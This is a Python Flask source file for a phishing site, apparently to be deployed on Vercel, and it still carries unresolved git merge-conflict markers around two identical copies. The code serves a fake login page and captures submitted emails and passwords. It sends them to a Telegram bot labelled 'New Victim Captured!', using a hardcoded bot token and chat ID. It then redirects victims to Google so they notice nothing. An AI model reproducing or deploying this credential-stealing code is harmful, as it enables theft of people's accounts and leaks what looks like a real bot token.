<<<<<<< HEAD
import os
import requests
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# --- SECURE CONFIGURATION (Use Vercel Environment Variables) ---
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8868420596:AAERC4_60wqXm0Nc6RPfjtecDQ2Cb659zKI")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "6354925459")

def send_to_telegram(username, password):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    message = f"🚨 **New Victim Captured!** 🚨\n\n**User:** {username}\n**Pass:** {password}"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        # Adding a timeout is critical to prevent the function from dying mid-request
        response = requests.post(url, data=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return False

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('email')
    password = request.form.get('pass')

    if username and password:
        # We await the result to ensure the function doesn't terminate too early
        success = send_to_telegram(username, password)
        if success:
            return redirect("https://www.google.com")
        else:
            # Even if it fails, redirect them so they feel nothing
            return redirect("https://www.google.com")

    return "No data captured", 400

# For Vercel, we don't use app.run(). The platform handles the execution.
# Ensure you have a vercel.json file to route requests to this app.
=======
import os
import requests
from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# --- SECURE CONFIGURATION (Use Vercel Environment Variables) ---
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8868420596:AAERC4_60wqXm0Nc6RPfjtecDQ2Cb659zKI")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "6354925459")

def send_to_telegram(username, password):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    message = f"🚨 **New Victim Captured!** 🚨\n\n**User:** {username}\n**Pass:** {password}"
    payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        # Adding a timeout is critical to prevent the function from dying mid-request
        response = requests.post(url, data=payload, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending to Telegram: {e}")
        return False

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/capture', methods=['POST'])
def capture():
    username = request.form.get('email')
    password = request.form.get('pass')

    if username and password:
        # We await the result to ensure the function doesn't terminate too early
        success = send_to_telegram(username, password)
        if success:
            return redirect("https://www.google.com")
        else:
            # Even if it fails, redirect them so they feel nothing
            return redirect("https://www.google.com")

    return "No data captured", 400

# For Vercel, we don't use app.run(). The platform handles the execution.
# Ensure you have a vercel.json file to route requests to this app.
>>>>>>> ac5badca4ceed33a647e9c979651e5cc7f60668c
